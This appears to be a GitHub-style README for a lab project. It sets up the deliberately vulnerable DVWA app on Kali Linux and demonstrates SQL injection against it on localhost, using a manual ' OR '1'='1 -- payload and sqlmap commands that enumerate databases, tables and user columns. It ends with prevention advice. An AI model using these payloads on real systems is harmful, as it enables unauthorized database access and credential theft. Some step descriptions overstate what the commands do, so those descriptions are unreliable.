# SQL Injection Exploitation and Security using DVWA on Kali Linux

## 📌 Project Overview
This project demonstrates how to exploit **SQL Injection** vulnerabilities using **Damn Vulnerable Web Application (DVWA)** on **Kali Linux**. The objective is to understand how attackers extract data from vulnerable databases and how to secure them against such attacks.

DVWA is a deliberately vulnerable web application designed for **learning penetration testing** techniques, particularly focusing on web security flaws like SQL Injection, XSS, and CSRF.

---

## 🛠 Tools Used
To perform SQL Injection attacks and security testing, the following tools are used:

- **Kali Linux** (for penetration testing)
- **DVWA (Damn Vulnerable Web Application)** (target web app)
- **MySQL** (database backend)
- **Burp Suite** (for manual SQL injection testing)
- **SQLMap** (for automated SQL injection attacks)

---

## ⚡ Key Tasks
The following penetration testing activities are performed:

1. **🛠 Setting up DVWA on Kali Linux**
2. **💉 Manually Exploiting SQL Injection**
3. **🔄 Using SQLMap to automate attacks**
4. **📂 Extracting sensitive data from databases**
5. **🛡️ Implementing security measures to prevent SQL injection**

---

## 🚀 How to Run

### ✅ Step 1: Clone DVWA Repository
First, clone the DVWA repository from GitHub:

\`\`\`bash
git clone https://github.com/digininja/DVWA
\`\`\`

Navigate into the DVWA directory:

\`\`\`bash
cd DVWA
\`\`\`

---

### ✅ Step 2: Install Dependencies
Ensure **Apache, PHP, and MySQL** are installed:

\`\`\`bash
sudo apt update
sudo apt install apache2 php php-mysqli mysql-server
\`\`\`

---

### ✅ Step 3: Configure DVWA
Move the DVWA files to the **web root directory**:

\`\`\`bash
sudo mv * /var/www/html/
\`\`\`

Change ownership and set permissions:

\`\`\`bash
sudo chown -R www-data:www-data /var/www/html/
sudo chmod -R 755 /var/www/html/
\`\`\`

---

### ✅ Step 4: Start Apache and MySQL
Enable and start the services:

\`\`\`bash
sudo systemctl start apache2
sudo systemctl enable apache2
sudo systemctl start mysql
sudo systemctl enable mysql
\`\`\`

---

### ✅ Step 5: Configure MySQL Database
Login to MySQL:

\`\`\`bash
sudo mysql -u root -p
\`\`\`

Create a **DVWA database** and user:

\`\`\`sql
CREATE DATABASE dvwa;
CREATE USER 'dvwauser'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwauser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
\`\`\`

Update the **DVWA config file** (`/var/www/html/config/config.inc.php`) with:

\`\`\`php
$_DVWA[ 'db_user' ] = 'dvwauser';
$_DVWA[ 'db_password' ] = 'password';
$_DVWA[ 'db_database' ] = 'dvwa';
\`\`\`

---

## 🕵️ SQL Injection Testing

### 🔹 1. Manually Exploiting SQL Injection
Navigate to the **SQL Injection page** in DVWA and enter:' OR '1'='1 --
This should bypass authentication.

---

### 🔹 2. Automating SQL Injection with SQLMap
Use **SQLMap** to extract database information:

\`\`\`bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxxx" --dbs
\`\`\`

Once the database names are found, extract tables:

\`\`\`bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxxx" -D dvwa --tables
\`\`\`

Extract **user credentials**:

\`\`\`bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=xxxx" -D dvwa -T users --columns
\`\`\`

---

## 🛡️ Preventive Measures
To secure against SQL Injection attacks, implement:

- **Prepared Statements** to prevent malicious SQL queries.
- **Input Validation** to filter dangerous characters.
- **Least Privilege Principle** for database users.
- **Web Application Firewalls (WAFs)** to block malicious payloads.

---

## 🎯 Conclusion
This project highlights how **SQL Injection vulnerabilities** can be exploited and how to **protect applications** against them. Ethical hackers and developers should continuously test and secure their applications.

**🔹 Disclaimer:** This guide is for educational purposes only. Do not attempt these attacks on unauthorized systems.
